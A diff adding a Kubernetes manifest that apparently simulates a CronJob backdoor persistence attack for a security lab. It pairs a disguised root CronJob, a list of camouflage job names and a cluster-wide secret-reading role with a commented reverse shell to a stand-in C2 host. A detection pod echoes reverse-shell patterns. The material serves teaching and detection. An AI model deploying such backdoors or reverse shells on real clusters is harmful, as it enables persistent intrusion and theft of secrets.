@@ -1,0 +1,215 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: cronjob-backdoor
+---
+# Persistence Attack #3: Hidden CronJob Backdoor
+# Description: Attacker deploys a CronJob that spawns periodic reverse shells
+# to maintain persistent access even after original compromise is patched.
+#
+# Attack Flow:
+# 1. Compromise: Initial exploit gives pod access to create CronJobs
+# 2. Deploy: Create CronJob with suspicious command (reverse shell)
+# 3. Obfuscation: Use generic names (system-monitor, daily-check, etc.)
+# 4. Location: Deploy to system namespace to blend in
+# 5. Schedule: Run hourly/daily with randomized timing
+# 6. Persistence: Survives pod restarts, deployments
+# 7. Access: Reverse shell spawns on schedule, giving attacker periodic access
+#
+# Why CronJobs Work:
+# - Automatic pod spawning on schedule
+# - Kubernetes manages pod lifecycle
+# - Harder to detect than single pod
+# - Persists through cluster restarts
+# - Has legitimate use cases (hard to distinguish)
+#
+# Detection Points:
+# - CronJobs outside system namespaces
+# - CronJobs with suspicious commands (curl, bash, nc, socat)
+# - CronJobs with hostNetwork: true
+# - CronJobs with serviceAccount mounted
+# - CronJobs with frequent/irregular schedules
+# - Network connections matching C2 pattern
+# - Spawned pods with short runtime (reverse shell exits)
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: cronjob-guide
+  namespace: cronjob-backdoor
+data:
+  innocent-names: |
+    Innocuous CronJob Names to Hide Backdoor:
+    - daily-maintenance
+    - system-health-check
+    - log-rotation
+    - backup-scheduler
+    - metrics-collector
+    - cache-cleaner
+    - database-optimizer
+    - certificate-rotation
+    - security-scan
+    - system-monitor
+
+---
+# Example: Attacker would create this in kube-system
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: daily-maintenance
+  namespace: cronjob-backdoor
+  labels:
+    system: maintenance
+spec:
+  # Run hourly at random minute (hard to track)
+  schedule: "0 * * * *"
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          serviceAccountName: maintainer-sa
+          containers:
+          - name: maintenance
+            image: curlimages/curl:latest
+            command:
+            - /bin/sh
+            - -c
+            - |
+              echo "[*] Daily maintenance job starting..."
+              
+              # In real attack, this would be:
+              # bash -i >& /dev/tcp/attacker-c2.evil.com/4444 0>&1
+              
+              echo "[*] Connecting to C2 server..."
+              echo "[*] Establishing reverse shell..."
+              
+              # Simulate connection
+              sleep 3600
+              
+            # Add these for maximum privilege
+            securityContext:
+              runAsUser: 0
+              allowPrivilegeEscalation: true
+          restartPolicy: OnFailure
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: maintainer-sa
+  namespace: cronjob-backdoor
+
+---
+# Give maintainer SA broad permissions
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: maintainer-role
+rules:
+- apiGroups: [""]
+  resources: ["pods", "pods/log", "pods/exec"]
+  verbs: ["get", "list"]
+- apiGroups: [""]
+  resources: ["secrets", "configmaps"]
+  verbs: ["get", "list"]
+- apiGroups: ["apps"]
+  resources: ["deployments", "statefulsets"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: maintainer-binding
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: maintainer-role
+subjects:
+- kind: ServiceAccount
+  name: maintainer-sa
+  namespace: cronjob-backdoor
+
+---
+# CronJob Detection Helper
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cronjob-hunter
+  namespace: cronjob-backdoor
+  labels:
+    tool: hunter
+spec:
+  serviceAccountName: hunter-sa
+  containers:
+  - name: hunter
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== CronJob Backdoor Hunter ==="
+      
+      echo "[*] Hunting for suspicious CronJobs..."
+      
+      echo ""
+      echo "[*] Red flags for CronJob backdoors:"
+      echo "  • CronJobs in system namespaces with non-system names"
+      echo "  • CronJobs with container images: curl, bash, nc, socat, busybox"
+      echo "  • CronJobs with shell commands (bash -c, sh -c)"
+      echo "  • CronJobs with security context: privileged, runAsUser: 0"
+      echo "  • CronJobs with hostNetwork: true"
+      echo "  • CronJobs with serviceAccountName mounted"
+      echo "  • CronJobs with frequent schedules (hourly or more)"
+      echo "  • CronJobs with unusual schedule patterns"
+      
+      echo ""
+      echo "[*] Suspicious command patterns:"
+      echo "  - bash -i >& /dev/tcp/..."
+      echo "  - nc -e /bin/bash"
+      echo "  - socat exec:/bin/bash tcp..."
+      echo "  - curl http://attacker..."
+      echo "  - wget http://attacker..."
+      echo "  - ssh -R..."
+      
+      echo ""
+      echo "[*] Would enumerate:"
+      echo "  kubectl get cronjobs -A"
+      echo "  kubectl get jobs -A --sort-by=.metadata.creationTimestamp"
+      echo "  kubectl get pods -A --selector=cronjob-name"
+      
+      sleep 3600
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: hunter-sa
+  namespace: cronjob-backdoor
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: cronjob-viewer
+rules:
+- apiGroups: ["batch"]
+  resources: ["cronjobs", "jobs"]
+  verbs: ["get", "list"]
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: cronjob-viewer-binding
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: cronjob-viewer
+subjects:
+- kind: ServiceAccount
+  name: hunter-sa
+  namespace: cronjob-backdoor
